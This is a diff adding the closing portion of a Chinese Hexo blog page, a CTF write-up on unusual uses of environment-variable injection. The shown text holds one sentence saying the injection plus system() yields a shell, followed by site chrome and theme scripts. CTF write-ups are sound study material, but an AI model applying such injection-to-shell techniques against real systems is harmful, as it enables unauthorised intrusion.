+<span class="token string">'1'</span>
+<span class="token operator">>></span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure>
+<p>成功注入环境变量，然后按照p神的方式，利用这个注入和system拿到shell即可。</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/CTF/" class="category-chain-item">CTF</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%B3%A8%E5%85%A5/">#环境变量注入</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>环境变量的一些奇特利用</div>
+      <div>http://example.com/2022/12/12/环境变量的一些奇特利用/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Epiphany</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2022年12月12日</div>
+        </div>
+      
+      
+      <div class="license-meta-item">
+        <div>许可协议</div>
+        <div>
+          
+            
+            
+              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+              <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                <i class="iconfont icon-by"></i>
+              </span>
+              </a>
+            
+          
+        </div>
+      </div>
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/12/09/file-puts-contents%E5%88%A9%E7%94%A8/" title="file_puts_contents利用">
+                        <span class="hidden-mobile">file_puts_contents利用</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  <article id="comments" lazyload>
+    
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.4.17/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"QC4vvYPEM2BYGMlNkxfbdllW-gzGzoHsz","appKey":"nsnNub648pvsc3yts6pFQY1A","path":"window.location.pathname","placeholder":"留言叭","avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"https://qc4vvype.lc-cn-n1-shared.com","emojiCDN":null,"emojiMaps":null,"enableQQ":true},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+  </article>
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <div style="font-size: 0.85rem"> <span id="website-duration">载入网站运行时间...</span> <script src="/js/duration.js"></script> </div>   
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         人
+      </span>
+    
+    
+
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      collapseDepth   : CONFIG.toc.collapseDepth || 0,
+      scrollSmooth    : true,
+      headingsOffset  : -boardTop
+    });
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+  });
+</script>
+
+
+  <script  src="https://lib.baomitu.com/prism/1.27.0/plugins/line-numbers/prism-line-numbers.min.js" ></script>
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
